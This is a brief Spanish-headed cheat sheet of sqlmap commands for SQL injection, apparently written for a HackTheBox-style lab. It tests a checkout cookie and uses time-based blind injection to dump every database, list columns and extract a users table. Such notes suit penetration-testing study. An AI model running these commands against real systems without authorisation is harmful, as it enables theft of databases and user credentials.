


# COOKIES
```shell
❯ sqlmap -u "https://checkout.shared.htb/" --cookie='custom_cart={"*":"1"}' --flush --fresh-queries --level=5 --risk=3 --batch
````


# BASADAS EN TIEMPO
### EXTRAER TODO
```shell
❯ sqlmap --risk 3 --level 5 --random-agent --dump-all -r ./request --technique=T --time-sec=1 --batch
```

### TODAS LAS COLUMNAS DE UNA BASE DE DATOS
```shell
❯ sqlmap --risk 3 --level 5 --random-agent -r ./request --technique=T --time-sec=1 --batch --columns -D scheduling_db
```

### LISTAR TODO EL CONTENIDO DE UNA TABLA
```shell
❯ sqlmap --risk 3 --level 5 --random-agent -r ./request --technique=T --time-sec=1 --batch --dump -D scheduling_db -T users
```